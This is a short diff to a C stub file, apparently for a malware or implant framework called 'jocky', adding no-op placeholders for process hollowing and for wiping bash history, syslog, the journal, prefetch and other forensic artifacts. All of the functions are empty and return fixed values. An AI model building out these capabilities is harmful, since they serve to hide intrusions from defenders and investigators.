@@ -2,6 +2,8 @@
 
 #include <unistd.h>
 #include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
 
 /* Module operations */
 int jocky_module_load(const char* path) { return -1; }
@@ -9,6 +11,19 @@ int jocky_module_unload(const char* name) { return -1; }
 int jocky_lkm_load(const char* path) { return -1; }
 int jocky_lkm_unload(const char* name) { return -1; }
 int jocky_module_base(const char* name) { return -1; }
+
+/* Process operations */
+int jocky_process_hollow(const char* path, const char* args) { return -1; }
+int jocky_process_hollow_linux(int pid, const char* elf_path) { return -1; }
+
+/* Forensics operations */
+int jocky_wipe_prefetch(void) { return 0; }
+int jocky_wipe_artifacts(void) { return 0; }
+int jocky_clear_logs(void) { return 0; }
+int jocky_cleanup_all(void) { return 0; }
+int linux_forensics_wipe_bash_history(void) { return 0; }
+int jocky_linux_cleanup_syslog(void) { return 0; }
+int jocky_linux_cleanup_journal(void) { return 0; }
 
 /* Windows forensics (no-ops on Linux) */
 int forensics_wipe_cmd_history(void) { return 0; }
@@ -29,6 +44,9 @@ int jocky_clear_srum(void) { return 0; }
 int jocky_patch_amcache(void) { return 0; }
 int jocky_patch_shimcache(void) { return 0; }
 int jocky_self_delete(void) { return 0; }
+
+/* Helper functions */
+void jocky_sleep_and_recheck(void) { sleep(1); }
 
 /* String operations */
 const char* jocky_str_concat(const char* a, const char* b) {
